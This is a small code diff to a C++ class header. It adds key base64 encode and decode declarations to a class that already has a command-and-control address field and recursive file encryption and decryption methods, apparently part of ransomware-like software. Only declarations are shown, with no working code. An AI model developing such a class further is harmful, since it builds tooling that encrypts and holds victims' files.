@@ -13,6 +13,8 @@ public:
     // isLogging getter setter
     cpr::Url C2Addr;
 
+    std::string base64EncodeKey();
+    void base64DecodeKey(const std::string& encodedKey);
     bool decryptFile(std::filesystem::path path);
     void decryptRecursively(const std::filesystem::path& path);
     bool encryptFile(const std::filesystem::path& pathIn);
